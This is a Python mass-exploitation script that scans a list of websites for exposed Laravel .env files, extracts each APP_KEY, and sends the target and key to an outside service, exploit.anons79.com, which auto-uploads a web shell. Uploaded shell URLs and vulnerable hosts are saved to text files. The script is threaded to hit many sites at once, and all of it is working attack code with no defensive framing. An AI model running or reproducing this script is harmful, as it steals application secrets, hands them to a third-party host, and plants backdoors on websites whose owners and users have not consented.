##Thanks To AzhariGanz
#Thanks To anons79
#i just take exploit from this https://exploit.anons79.com/ sites

import requests
import re, sys
import threading

pala = {'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'}
  
def exploit(url, appkey):
  pdata = {
    'target': url,
    'key': appkey,
    'autoshell': 'Auto+Upload+Shell'
  }
  purl = 'https://exploit.anons79.com'
  try:
    upShell = requests.post(purl, data=pdata, headers=pala).text
    cekShell = re.findall("""<a href='(.*?)' target='_blank'>""", upShell)
    if cekShell:
      print('[+] Success Upload >> {} [+]'.format(cekShell[0]))
      sv = open('shell.txt', 'a')
      sv.write(cekShell[0]+'\n')
      sv.close()
    else:
      print('[-] Not Vuln {} [-]'.format(url))
  except:
    print('[-] Something wrong but i dont know :( [-]')
  
def cekvuln(url):
  if '://' in url:
    pass
  else:
    url = 'http://'+url
  vulnsite = url+'/.env'
  try:
    cek = requests.get(vulnsite, headers=pala , timeout=7).text
    getApp = re.findall('APP_KEY=base64:(.*?)\n', cek)
    if getApp:
      exploit(url, getApp[0])
      sv = open('appkey.txt', 'a')
      sv.write(url+'\n')
      sv.close()
    else:
      print('[-] Cant get APP_KEY >> {} [-]'.format(url))
  except:
    print('[-] Something wrong but i dont know :( [-]')

threads = []
if len(sys.argv) != 2:
  print('[-] python {} yourlist.txt [-]'.format(sys.argv[0]))
  sys.exit()
else:
  lists = open(sys.argv[1], 'r').read().splitlines()
  for tar in lists:
    t = threading.Thread(target=cekvuln, args=(tar,))
    threads.append(t)
    t.start()
  
for t in threads:
  t.join()

print('[+] End Bro :) [+]')
